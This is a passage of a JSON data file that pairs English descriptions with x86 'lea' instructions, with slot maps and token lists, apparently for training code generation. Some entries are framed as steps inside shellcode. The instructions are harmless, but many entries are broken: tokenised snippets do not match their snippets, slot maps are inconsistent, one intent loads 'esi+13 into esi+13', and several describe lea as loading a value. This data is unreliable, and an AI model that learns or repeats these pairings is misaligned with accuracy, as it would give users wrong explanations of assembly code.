    "intent": "load the effective address of the result of the operation [ebx+0xf] into the eax register",
    "rewritten_intent": "load the effective address of the result of the operation [ebx+0xf] into the eax register",
    "snippet": "lea eax, [ebx+0xf]",
    "slot_map": {
      "ebx+0xf": "var1",
      "[": "var0",
      "eax": "var2"
    },
    "intent_tokens": [
      "load",
      "effective",
      "address",
      "result",
      "operation",
      "[",
      "var1",
      "]",
      "var2",
      "register"
    ],
    "snippet_tokens": [
      "lea",
      "var1",
      ",",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "load the effective address of the result of the operation [ebx+17h] into the eax register",
    "rewritten_intent": "load the effective address of the result of the operation [ebx+17h] into the eax register",
    "snippet": "lea eax, [ebx+17h]",
    "slot_map": {
      "ebx+17h": "var1",
      "[": "var0",
      "eax": "var2"
    },
    "intent_tokens": [
      "load",
      "effective",
      "address",
      "result",
      "operation",
      "[",
      "var1",
      "]",
      "var2",
      "register"
    ],
    "snippet_tokens": [
      "lea",
      "var1",
      ",",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "put the address of ebx+8 into eax",
    "rewritten_intent": "put the address of ebx+8 into eax",
    "snippet": "lea eax, [ebx+8]",
    "slot_map": {
      "ebx+8": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "put",
      "address",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "lea",
      "var1",
      ",",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "load the effective address of the result of the operation [ecx+0bh] into the eax register",
    "rewritten_intent": "load the effective address of the result of the operation [ecx+0bh] into the eax register",
    "snippet": "lea eax, [ecx+0bh]",
    "slot_map": {
      "ecx+0bh": "var1",
      "[": "var0",
      "eax": "var2"
    },
    "intent_tokens": [
      "load",
      "effective",
      "address",
      "result",
      "operation",
      "[",
      "var1",
      "]",
      "var2",
      "register"
    ],
    "snippet_tokens": [
      "lea",
      "var1",
      ",",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "load the effective address of the result of the operation [ecx+4] into the eax register",
    "rewritten_intent": "load the effective address of the result of the operation [ecx+4] into the eax register",
    "snippet": "lea eax, [ecx+4]",
    "slot_map": {
      "ecx+4": "var1",
      "[": "var0",
      "eax": "var2"
    },
    "intent_tokens": [
      "load",
      "effective",
      "address",
      "result",
      "operation",
      "[",
      "var1",
      "]",
      "var2",
      "register"
    ],
    "snippet_tokens": [
      "lea",
      "var1",
      ",",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "point eax to the start of the shellcode",
    "rewritten_intent": "point eax to the start of the shellcode",
    "snippet": "lea eax, [esi]",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "point",
      "var0",
      "start",
      "shellcode"
    ],
    "snippet_tokens": [
      "lea",
      "var0",
      ",",
      "[",
      "esi",
      "]"
    ]
  },
  {
    "intent": "point eax to the next byte of the shellcode",
    "rewritten_intent": "point eax to the next byte of the shellcode",
    "snippet": "lea eax, [esi+1]",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "point",
      "var0",
      "next",
      "byte",
      "shellcode"
    ],
    "snippet_tokens": [
      "lea",
      "var0",
      ",",
      "[",
      "esi+1",
      "]"
    ]
  },
  {
    "intent": "place the value val in eax",
    "rewritten_intent": "place the value val in eax",
    "snippet": "lea eax, [val]",
    "slot_map": {
      "val": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "place",
      "value",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "lea",
      "var1",
      ",",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "place the address of var in eax",
    "rewritten_intent": "place the address of var in eax",
    "snippet": "lea eax, [var]",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "place",
      "address",
      "var",
      "var0"
    ],
    "snippet_tokens": [
      "lea",
      "var0",
      ",",
      "[",
      "var",
      "]"
    ]
  },
  {
    "intent": "place the value in var in eax",
    "rewritten_intent": "place the value in var in eax",
    "snippet": "lea eax, [var]",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "place",
      "value",
      "var",
      "var0"
    ],
    "snippet_tokens": [
      "lea",
      "var0",
      ",",
      "[",
      "var",
      "]"
    ]
  },
  {
    "intent": "load the effective address [zero_reg+3] into eax",
    "rewritten_intent": "load the effective address [zero_reg+3] into eax",
    "snippet": "lea eax, [zero_reg+3]",
    "slot_map": {
      "zero_reg+3": "var1",
      "[": "var0",
      "eax": "var2"
    },
    "intent_tokens": [
      "load",
      "effective",
      "address",
      "[",
      "var1",
      "]",
      "var2"
    ],
    "snippet_tokens": [
      "lea",
      "var0",
      ",",
      "[",
      "var",
      "]"
    ]
  },
  {
    "intent": "load the effective address of the result of the operation [zero_reg+3] into the eax register",
    "rewritten_intent": "load the effective address of the result of the operation [zero_reg+3] into the eax register",
    "snippet": "lea eax, [zero_reg+3]",
    "slot_map": {
      "zero_reg+3": "var1",
      "[": "var0",
      "]": "var2",
      "eax": "var3"
    },
    "intent_tokens": [
      "load",
      "effective",
      "address",
      "result",
      "operation",
      "[",
      "var1",
      "]",
      "var3",
      "register"
    ],
    "snippet_tokens": [
      "lea",
      "var0",
      ",",
      "[",
      "var",
      "]"
    ]
  },
  {
    "intent": "load the effective address [zero_reg+6] into eax",
    "rewritten_intent": "load the effective address [zero_reg+6] into eax",
    "snippet": "lea eax, [zero_reg+6]",
    "slot_map": {
      "zero_reg+6": "var1",
      "[": "var0",
      "]": "var2",
      "eax": "var3"
    },
    "intent_tokens": [
      "load",
      "effective",
      "address",
      "[",
      "var1",
      "]",
      "var3"
    ],
    "snippet_tokens": [
      "lea",
      "var0",
      ",",
      "[",
      "var",
      "]"
    ]
  },
  {
    "intent": "load the effective address of the result of the operation [zero_reg+6] into the eax register",
    "rewritten_intent": "load the effective address of the result of the operation [zero_reg+6] into the eax register",
    "snippet": "lea eax, [zero_reg+6]",
    "slot_map": {
      "zero_reg+6": "var1",
      "[": "var0",
      "]": "var2",
      "eax": "var3"
    },
    "intent_tokens": [
      "load",
      "effective",
      "address",
      "result",
      "operation",
      "[",
      "var1",
      "]",
      "var3",
      "register"
    ],
    "snippet_tokens": [
      "lea",
      "var0",
      ",",
      "[",
      "var",
      "]"
    ]
  },
  {
    "intent": "load the effective address [zero_reg+66h] into eax",
    "rewritten_intent": "load the effective address [zero_reg+66h] into eax",
    "snippet": "lea eax, [zero_reg+66h]",
    "slot_map": {
      "zero_reg+66h": "var1",
      "[": "var0",
      "eax": "var2"
    },
    "intent_tokens": [
      "load",
      "effective",
      "address",
      "[",
      "var1",
      "]",
      "var2"
    ],
    "snippet_tokens": [
      "lea",
      "var0",
      ",",
      "[",
      "var",
      "]"
    ]
  },
  {
    "intent": "load the effective address of the result of the operation [zero_reg+66h] into the eax register",
    "rewritten_intent": "load the effective address of the result of the operation [zero_reg+66h] into the eax register",
    "snippet": "lea eax, [zero_reg+66h]",
    "slot_map": {
      "zero_reg+66h": "var1",
      "[": "var0",
      "]": "var2",
      "eax": "var3"
    },
    "intent_tokens": [
      "load",
      "effective",
      "address",
      "result",
      "operation",
      "[",
      "var1",
      "]",
      "var3",
      "register"
    ],
    "snippet_tokens": [
      "lea",
      "var0",
      ",",
      "[",
      "var",
      "]"
    ]
  },
  {
    "intent": "load the effective address of the operation [ebx+0xb] into the eax register",
    "rewritten_intent": "load the effective address of the operation [ebx+0xb] into the eax register",
    "snippet": "lea eax,[ebx+0xb]",
    "slot_map": {
      "ebx+0xb": "var1",
      "[": "var0",
      "]": "var2",
      "eax": "var3"
    },
    "intent_tokens": [
      "load",
      "effective",
      "address",
      "operation",
      "[",
      "var1",
      "]",
      "var3",
      "register"
    ],
    "snippet_tokens": [
      "lea",
      "var0",
      ",",
      "[",
      "var",
      "]"
    ]
  },
  {
    "intent": "load the effective address of the operation [ebp+0x59] into the ebp register",
    "rewritten_intent": "load the effective address of the operation [ebp+0x59] into the ebp register",
    "snippet": "lea ebp,[ebp+0x59]",
    "slot_map": {
      "ebp+0x59": "var1",
      "[": "var0"
    },
    "intent_tokens": [
      "load",
      "effective",
      "address",
      "operation",
      "[",
      "var1",
      "]",
      "ebp",
      "register"
    ],
    "snippet_tokens": [
      "lea",
      "var0",
      ",",
      "[",
      "var",
      "]"
    ]
  },
  {
    "intent": "load the effective address [ebp-8] into ebx",
    "rewritten_intent": "load the effective address [ebp-8] into ebx",
    "snippet": "lea ebx, [ebp-8]",
    "slot_map": {
      "ebp-8": "var1",
      "[": "var0",
      "ebx": "var2"
    },
    "intent_tokens": [
      "load",
      "effective",
      "address",
      "[",
      "var1",
      "]",
      "var2"
    ],
    "snippet_tokens": [
      "lea",
      "var0",
      ",",
      "[",
      "var",
      "]"
    ]
  },
  {
    "intent": "load the effective address of ebp-8 into the ebx register",
    "rewritten_intent": "load the effective address of ebp-8 into the ebx register",
    "snippet": "lea ebx, [ebp-8]",
    "slot_map": {
      "ebp-8": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "load",
      "effective",
      "address",
      "var0",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "lea",
      "var1",
      ",",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "load the effective address [ebp+24] into ebx",
    "rewritten_intent": "load the effective address [ebp+24] into ebx",
    "snippet": "lea ebx, [ebp+24]",
    "slot_map": {
      "ebp+24": "var1",
      "[": "var0",
      "ebx": "var2"
    },
    "intent_tokens": [
      "load",
      "effective",
      "address",
      "[",
      "var1",
      "]",
      "var2"
    ],
    "snippet_tokens": [
      "lea",
      "var1",
      ",",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "load the effective address of the result of the operation [ebp+24] into the ebx register",
    "rewritten_intent": "load the effective address of the result of the operation [ebp+24] into the ebx register",
    "snippet": "lea ebx, [ebp+24]",
    "slot_map": {
      "ebp+24": "var1",
      "[": "var0",
      "ebx": "var2"
    },
    "intent_tokens": [
      "load",
      "effective",
      "address",
      "result",
      "operation",
      "[",
      "var1",
      "]",
      "var2",
      "register"
    ],
    "snippet_tokens": [
      "lea",
      "var1",
      ",",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "load the effective address [ebp+39] into ebx",
    "rewritten_intent": "load the effective address [ebp+39] into ebx",
    "snippet": "lea ebx, [ebp+39]",
    "slot_map": {
      "ebp+39": "var1",
      "[": "var0",
      "ebx": "var2"
    },
    "intent_tokens": [
      "load",
      "effective",
      "address",
      "[",
      "var1",
      "]",
      "var2"
    ],
    "snippet_tokens": [
      "lea",
      "var1",
      ",",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "load the effective address of the result of the operation [ebp+39] into the ebx register",
    "rewritten_intent": "load the effective address of the result of the operation [ebp+39] into the ebx register",
    "snippet": "lea ebx, [ebp+39]",
    "slot_map": {
      "ebp+39": "var1",
      "[": "var0",
      "ebx": "var2"
    },
    "intent_tokens": [
      "load",
      "effective",
      "address",
      "result",
      "operation",
      "[",
      "var1",
      "]",
      "var2",
      "register"
    ],
    "snippet_tokens": [
      "lea",
      "var1",
      ",",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "load the effective address of edx+0x4 into ebx",
    "rewritten_intent": "load the effective address of edx+0x4 into ebx",
    "snippet": "lea ebx, [edx+0x4]",
    "slot_map": {
      "edx+0x4": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "load",
      "effective",
      "address",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "lea",
      "var1",
      ",",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "load the effective address of esi into the ebx register",
    "rewritten_intent": "load the effective address of esi into the ebx register",
    "snippet": "lea ebx, [esi]",
    "slot_map": {
      "esi": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "load",
      "effective",
      "address",
      "var0",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "lea",
      "var1",
      ",",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "point ebx to the start of the shellcode",
    "rewritten_intent": "point ebx to the start of the shellcode",
    "snippet": "lea ebx, [esi]",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "point",
      "var0",
      "start",
      "shellcode"
    ],
    "snippet_tokens": [
      "lea",
      "var0",
      ",",
      "[",
      "esi",
      "]"
    ]
  },
  {
    "intent": "point ebx to the next byte of the shellcode",
    "rewritten_intent": "point ebx to the next byte of the shellcode",
    "snippet": "lea ebx, [esi+1]",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "point",
      "var0",
      "next",
      "byte",
      "shellcode"
    ],
    "snippet_tokens": [
      "lea",
      "var0",
      ",",
      "[",
      "esi+1",
      "]"
    ]
  },
  {
    "intent": "load the effective address of the result of the operation [esi+13] into the ebx register",
    "rewritten_intent": "load the effective address of the result of the operation [esi+13] into the ebx register",
    "snippet": "lea ebx, [esi+13]",
    "slot_map": {
      "esi+13": "var1",
      "[": "var0",
      "ebx": "var2"
    },
    "intent_tokens": [
      "load",
      "effective",
      "address",
      "result",
      "operation",
      "[",
      "var1",
      "]",
      "var2",
      "register"
    ],
    "snippet_tokens": [
      "lea",
      "var0",
      ",",
      "[",
      "esi+1",
      "]"
    ]
  },
  {
    "intent": "load the effective address of the result of the operation [esi+14] into the ebx register",
    "rewritten_intent": "load the effective address of the result of the operation [esi+14] into the ebx register",
    "snippet": "lea ebx, [esi+14]",
    "slot_map": {
      "esi+14": "var1",
      "[": "var0",
      "ebx": "var2"
    },
    "intent_tokens": [
      "load",
      "effective",
      "address",
      "result",
      "operation",
      "[",
      "var1",
      "]",
      "var2",
      "register"
    ],
    "snippet_tokens": [
      "lea",
      "var0",
      ",",
      "[",
      "esi+1",
      "]"
    ]
  },
  {
    "intent": "load the effective address [esi+15] into ebx",
    "rewritten_intent": "load the effective address [esi+15] into ebx",
    "snippet": "lea ebx, [esi+15]",
    "slot_map": {
      "esi+15": "var1",
      "[": "var0",
      "ebx": "var2"
    },
    "intent_tokens": [
      "load",
      "effective",
      "address",
      "[",
      "var1",
      "]",
      "var2"
    ],
    "snippet_tokens": [
      "lea",
      "var0",
      ",",
      "[",
      "esi+1",
      "]"
    ]
  },
  {
    "intent": "load the effective address of the result of the operation [esi+15] into the ebx register",
    "rewritten_intent": "load the effective address of the result of the operation [esi+15] into the ebx register",
    "snippet": "lea ebx, [esi+15]",
    "slot_map": {
      "esi+15": "var1",
      "[": "var0",
      "ebx": "var2"
    },
    "intent_tokens": [
      "load",
      "effective",
      "address",
      "result",
      "operation",
      "[",
      "var1",
      "]",
      "var2",
      "register"
    ],
    "snippet_tokens": [
      "lea",
      "var0",
      ",",
      "[",
      "esi+1",
      "]"
    ]
  },
  {
    "intent": "load the effective address of the result of the operation [esi+23] into the ebx register",
    "rewritten_intent": "load the effective address of the result of the operation [esi+23] into the ebx register",
    "snippet": "lea ebx, [esi+23]",
    "slot_map": {
      "esi+23": "var1",
      "[": "var0",
      "]": "var2",
      "ebx": "var3"
    },
    "intent_tokens": [
      "load",
      "effective",
      "address",
      "result",
      "operation",
      "[",
      "var1",
      "]",
      "var3",
      "register"
    ],
    "snippet_tokens": [
      "lea",
      "var0",
      ",",
      "[",
      "esi+1",
      "]"
    ]
  },
  {
    "intent": "load the effective address [esp+1] into ebx",
    "rewritten_intent": "load the effective address [esp+1] into ebx",
    "snippet": "lea ebx, [esp +1]",
    "slot_map": {
      "esp+1": "var1",
      "[": "var0",
      "ebx": "var2"
    },
    "intent_tokens": [
      "load",
      "effective",
      "address",
      "[",
      "var1",
      "]",
      "var2"
    ],
    "snippet_tokens": [
      "lea",
      "var0",
      ",",
      "[",
      "esi+1",
      "]"
    ]
  },
  {
    "intent": "load the effective address of the result of the operation [esp +1] into the ebx register",
    "rewritten_intent": "load the effective address of the result of the operation [esp +1] into the ebx register",
    "snippet": "lea ebx, [esp +1]",
    "slot_map": {
      "esp +1": "var1",
      "[": "var0",
      "]": "var2",
      "ebx": "var3"
    },
    "intent_tokens": [
      "load",
      "effective",
      "address",
      "result",
      "operation",
      "[",
      "var1",
      "]",
      "var3",
      "register"
    ],
    "snippet_tokens": [
      "lea",
      "var0",
      ",",
      "[",
      "esi+1",
      "]"
    ]
  },
  {
    "intent": "load the effective address of esp into ebx",
    "rewritten_intent": "load the effective address of esp into ebx",
    "snippet": "lea ebx, [esp]",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "load",
      "effective",
      "address",
      "esp",
      "var0"
    ],
    "snippet_tokens": [
      "lea",
      "var0",
      ",",
      "[",
      "esp",
      "]"
    ]
  },
  {
    "intent": "load the effective address of esp into the ebx register",
    "rewritten_intent": "load the effective address of esp into the ebx register",
    "snippet": "lea ebx, [esp]",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "load",
      "effective",
      "address",
      "esp",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "lea",
      "var0",
      ",",
      "[",
      "esp",
      "]"
    ]
  },
  {
    "intent": "load the effective address [zero_reg+3] into ebx",
    "rewritten_intent": "load the effective address [zero_reg+3] into ebx",
    "snippet": "lea ebx, [zero_reg+3]",
    "slot_map": {
      "zero_reg+3": "var1",
      "[": "var0",
      "ebx": "var2"
    },
    "intent_tokens": [
      "load",
      "effective",
      "address",
      "[",
      "var1",
      "]",
      "var2"
    ],
    "snippet_tokens": [
      "lea",
      "var0",
      ",",
      "[",
      "esp",
      "]"
    ]
  },
  {
    "intent": "load the effective address of the result of the operation [zero_reg+3] into the ebx register",
    "rewritten_intent": "load the effective address of the result of the operation [zero_reg+3] into the ebx register",
    "snippet": "lea ebx, [zero_reg+3]",
    "slot_map": {
      "zero_reg+3": "var1",
      "[": "var0",
      "]": "var2",
      "ebx": "var3"
    },
    "intent_tokens": [
      "load",
      "effective",
      "address",
      "result",
      "operation",
      "[",
      "var1",
      "]",
      "var3",
      "register"
    ],
    "snippet_tokens": [
      "lea",
      "var0",
      ",",
      "[",
      "esp",
      "]"
    ]
  },
  {
    "intent": "load the effective address of the result of the operation [eax] into the ecx register",
    "rewritten_intent": "load the effective address of the result of the operation [eax] into the ecx register",
    "snippet": "lea ecx, [eax]",
    "slot_map": {
      "eax": "var1",
      "[": "var0",
      "ecx": "var2"
    },
    "intent_tokens": [
      "load",
      "effective",
      "address",
      "result",
      "operation",
      "[",
      "var1",
      "]",
      "var2",
      "register"
    ],
    "snippet_tokens": [
      "lea",
      "var0",
      ",",
      "[",
      "esp",
      "]"
    ]
  },
  {
    "intent": "load the effective address [ebp+28] into ecx",
    "rewritten_intent": "load the effective address [ebp+28] into ecx",
    "snippet": "lea ecx, [ebp+28]",
    "slot_map": {
      "ebp+28": "var1",
      "[": "var0",
      "ecx": "var2"
    },
    "intent_tokens": [
      "load",
      "effective",
      "address",
      "[",
      "var1",
      "]",
      "var2"
    ],
    "snippet_tokens": [
      "lea",
      "var0",
      ",",
      "[",
      "esp",
      "]"
    ]
  },
  {
    "intent": "load the effective address of the result of the operation [ebp+28] into the ecx register",
    "rewritten_intent": "load the effective address of the result of the operation [ebp+28] into the ecx register",
    "snippet": "lea ecx, [ebp+28]",
    "slot_map": {
      "ebp+28": "var1",
      "[": "var0",
      "ecx": "var2"
    },
    "intent_tokens": [
      "load",
      "effective",
      "address",
      "result",
      "operation",
      "[",
      "var1",
      "]",
      "var2",
      "register"
    ],
    "snippet_tokens": [
      "lea",
      "var0",
      ",",
      "[",
      "esp",
      "]"
    ]
  },
  {
    "intent": "load the value of ebx+0xff into register ecx",
    "rewritten_intent": "load the value of ebx+0xff into register ecx",
    "snippet": "lea ecx, [ebx+0xff]",
    "slot_map": {
      "ebx+0xff": "var0",
      "ecx": "var1"
    },
    "intent_tokens": [
      "load",
      "value",
      "var0",
      "register",
      "var1"
    ],
    "snippet_tokens": [
      "lea",
      "var1",
      ",",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "load the effective address of ebx+8 into ecx",
    "rewritten_intent": "load the effective address of ebx+8 into ecx",
    "snippet": "lea ecx, [ebx+8]",
    "slot_map": {
      "ebx+8": "var0",
      "ecx": "var1"
    },
    "intent_tokens": [
      "load",
      "effective",
      "address",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "lea",
      "var1",
      ",",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "load the effective address of the result of the operation [esi + 8] into the ecx register",
    "rewritten_intent": "load the effective address of the result of the operation [esi + 8] into the ecx register",
    "snippet": "lea ecx, [esi + 8]",
    "slot_map": {
      "esi + 8": "var1",
      "[": "var0",
      "ecx": "var2"
    },
    "intent_tokens": [
      "load",
      "effective",
      "address",
      "result",
      "operation",
      "[",
      "var1",
      "]",
      "var2",
      "register"
    ],
    "snippet_tokens": [
      "lea",
      "var1",
      ",",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "point ecx to the start of the shellcode",
    "rewritten_intent": "point ecx to the start of the shellcode",
    "snippet": "lea ecx, [esi]",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "point",
      "var0",
      "start",
      "shellcode"
    ],
    "snippet_tokens": [
      "lea",
      "var0",
      ",",
      "[",
      "esi",
      "]"
    ]
  },
  {
    "intent": "point ecx to the next byte of the shellcode",
    "rewritten_intent": "point ecx to the next byte of the shellcode",
    "snippet": "lea ecx, [esi+1]",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "point",
      "var0",
      "next",
      "byte",
      "shellcode"
    ],
    "snippet_tokens": [
      "lea",
      "var0",
      ",",
      "[",
      "esi+1",
      "]"
    ]
  },
  {
    "intent": "load the effective address [esi+18] into ecx",
    "rewritten_intent": "load the effective address [esi+18] into ecx",
    "snippet": "lea ecx, [esi+18]",
    "slot_map": {
      "esi+18": "var1",
      "[": "var0",
      "]": "var2",
      "ecx": "var3"
    },
    "intent_tokens": [
      "load",
      "effective",
      "address",
      "[",
      "var1",
      "]",
      "var3"
    ],
    "snippet_tokens": [
      "lea",
      "var0",
      ",",
      "[",
      "esi+1",
      "]"
    ]
  },
  {
    "intent": "load the effective address of the result of the operation [esi+18] into the ecx register",
    "rewritten_intent": "load the effective address of the result of the operation [esi+18] into the ecx register",
    "snippet": "lea ecx, [esi+18]",
    "slot_map": {
      "esi+18": "var1",
      "[": "var0",
      "]": "var2",
      "ecx": "var3"
    },
    "intent_tokens": [
      "load",
      "effective",
      "address",
      "result",
      "operation",
      "[",
      "var1",
      "]",
      "var3",
      "register"
    ],
    "snippet_tokens": [
      "lea",
      "var0",
      ",",
      "[",
      "esi+1",
      "]"
    ]
  },
  {
    "intent": "load the effective address of the result of the operation [esi+22] into the ecx register",
    "rewritten_intent": "load the effective address of the result of the operation [esi+22] into the ecx register",
    "snippet": "lea ecx, [esi+22]",
    "slot_map": {
      "esi+22": "var1",
      "[": "var0",
      "ecx": "var2"
    },
    "intent_tokens": [
      "load",
      "effective",
      "address",
      "result",
      "operation",
      "[",
      "var1",
      "]",
      "var2",
      "register"
    ],
    "snippet_tokens": [
      "lea",
      "var0",
      ",",
      "[",
      "esi+1",
      "]"
    ]
  },
  {
    "intent": "load the effective address of the result of the operation [esi+35] into the ecx register",
    "rewritten_intent": "load the effective address of the result of the operation [esi+35] into the ecx register",
    "snippet": "lea ecx, [esi+35]",
    "slot_map": {
      "esi+35": "var1",
      "[": "var0",
      "ecx": "var2"
    },
    "intent_tokens": [
      "load",
      "effective",
      "address",
      "result",
      "operation",
      "[",
      "var1",
      "]",
      "var2",
      "register"
    ],
    "snippet_tokens": [
      "lea",
      "var0",
      ",",
      "[",
      "esi+1",
      "]"
    ]
  },
  {
    "intent": "load the effective address of the result of the operation [esi+8] into the ecx register",
    "rewritten_intent": "load the effective address of the result of the operation [esi+8] into the ecx register",
    "snippet": "lea ecx, [esi+8]",
    "slot_map": {
      "esi+8": "var1",
      "[": "var0",
      "ecx": "var2"
    },
    "intent_tokens": [
      "load",
      "effective",
      "address",
      "result",
      "operation",
      "[",
      "var1",
      "]",
      "var2",
      "register"
    ],
    "snippet_tokens": [
      "lea",
      "var0",
      ",",
      "[",
      "esi+1",
      "]"
    ]
  },
  {
    "intent": "load the effective address of esp into the ecx register",
    "rewritten_intent": "load the effective address of esp into the ecx register",
    "snippet": "lea ecx, [esp]",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "load",
      "effective",
      "address",
      "esp",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "lea",
      "var0",
      ",",
      "[",
      "esp",
      "]"
    ]
  },
  {
    "intent": "load the effective address [zero_reg+117] into ecx",
    "rewritten_intent": "load the effective address [zero_reg+117] into ecx",
    "snippet": "lea ecx, [zero_reg+117]",
    "slot_map": {
      "zero_reg+117": "var1",
      "[": "var0",
      "ecx": "var2"
    },
    "intent_tokens": [
      "load",
      "effective",
      "address",
      "[",
      "var1",
      "]",
      "var2"
    ],
    "snippet_tokens": [
      "lea",
      "var0",
      ",",
      "[",
      "esp",
      "]"
    ]
  },
  {
    "intent": "load the effective address of the result of the operation [zero_reg+117] into the ecx register",
    "rewritten_intent": "load the effective address of the result of the operation [zero_reg+117] into the ecx register",
    "snippet": "lea ecx, [zero_reg+117]",
    "slot_map": {
      "zero_reg+117": "var1",
      "[": "var0",
      "ecx": "var2"
    },
    "intent_tokens": [
      "load",
      "effective",
      "address",
      "result",
      "operation",
      "[",
      "var1",
      "]",
      "var2",
      "register"
    ],
    "snippet_tokens": [
      "lea",
      "var0",
      ",",
      "[",
      "esp",
      "]"
    ]
  },
  {
    "intent": "load the effective address [zero_reg+3] into ecx",
    "rewritten_intent": "load the effective address [zero_reg+3] into ecx",
    "snippet": "lea ecx, [zero_reg+3]",
    "slot_map": {
      "zero_reg+3": "var1",
      "[": "var0",
      "]": "var2",
      "ecx": "var3"
    },
    "intent_tokens": [
      "load",
      "effective",
      "address",
      "[",
      "var1",
      "]",
      "var3"
    ],
    "snippet_tokens": [
      "lea",
      "var0",
      ",",
      "[",
      "esp",
      "]"
    ]
  },
  {
    "intent": "load the effective address of the result of the operation [zero_reg+3] into the ecx register",
    "rewritten_intent": "load the effective address of the result of the operation [zero_reg+3] into the ecx register",
    "snippet": "lea ecx, [zero_reg+3]",
    "slot_map": {
      "zero_reg+3": "var1",
      "[": "var0",
      "]": "var2",
      "ecx": "var3"
    },
    "intent_tokens": [
      "load",
      "effective",
      "address",
      "result",
      "operation",
      "[",
      "var1",
      "]",
      "var3",
      "register"
    ],
    "snippet_tokens": [
      "lea",
      "var0",
      ",",
      "[",
      "esp",
      "]"
    ]
  },
  {
    "intent": "load the effective address [ebx] into edi",
    "rewritten_intent": "load the effective address [ebx] into edi",
    "snippet": "lea edi, [ebx]",
    "slot_map": {
      "ebx": "var1",
      "[": "var0",
      "]": "var2",
      "edi": "var3"
    },
    "intent_tokens": [
      "load",
      "effective",
      "address",
      "[",
      "var1",
      "]",
      "var3"
    ],
    "snippet_tokens": [
      "lea",
      "var0",
      ",",
      "[",
      "esp",
      "]"
    ]
  },
  {
    "intent": "load the effective address of ebx into the edi register",
    "rewritten_intent": "load the effective address of ebx into the edi register",
    "snippet": "lea edi, [ebx]",
    "slot_map": {
      "ebx": "var0",
      "edi": "var1"
    },
    "intent_tokens": [
      "load",
      "effective",
      "address",
      "var0",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "lea",
      "var1",
      ",",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "place the quantity ebx+4*esi in edi",
    "rewritten_intent": "place the quantity ebx+4*esi in edi",
    "snippet": "lea edi, [ebx+4*esi]",
    "slot_map": {
      "ebx+4*esi": "var0",
      "edi": "var1"
    },
    "intent_tokens": [
      "place",
      "quantity",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "lea",
      "var1",
      ",",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "load the effective address of [esi + 1] into the edi register",
    "rewritten_intent": "load the effective address of [esi + 1] into the edi register",
    "snippet": "lea edi, [esi +1]",
    "slot_map": {
      "esi + 1": "var1",
      "[": "var0",
      "edi": "var2"
    },
    "intent_tokens": [
      "load",
      "effective",
      "address",
      "[",
      "var1",
      "]",
      "var2",
      "register"
    ],
    "snippet_tokens": [
      "lea",
      "var1",
      ",",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "load the effective address of esi+13 into esi+13",
    "rewritten_intent": "load the effective address of esi+13 into esi+13",
    "snippet": "lea edi, [esi+13]",
    "slot_map": {
      "esi+13": "var0"
    },
    "intent_tokens": [
      "load",
      "effective",
      "address",
      "var0",
      "esi+13"
    ],
    "snippet_tokens": [
      "lea",
      "edi",
      ",",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "load the effective address of ebx+12 into edx",
    "rewritten_intent": "load the effective address of ebx+12 into edx",
    "snippet": "lea edx, [ebx+12]",
    "slot_map": {
      "ebx+12": "var0",
      "edx": "var1"
    },
    "intent_tokens": [
      "load",
      "effective",
      "address",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "lea",
      "var1",
      ",",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "load the effective address of the result of the operation [esi + 12] into the edx register",
    "rewritten_intent": "load the effective address of the result of the operation [esi + 12] into the edx register",
    "snippet": "lea edx, [esi + 12]",
    "slot_map": {
      "esi + 12": "var1",
      "[": "var0",
      "edx": "var2"
    },
    "intent_tokens": [
      "load",
      "effective",
      "address",
      "result",
      "operation",
      "[",
      "var1",
      "]",
      "var2",
      "register"
    ],
    "snippet_tokens": [
      "lea",
      "var1",
      ",",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "point edx to the start of the shellcode",
    "rewritten_intent": "point edx to the start of the shellcode",
    "snippet": "lea edx, [esi]",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "point",
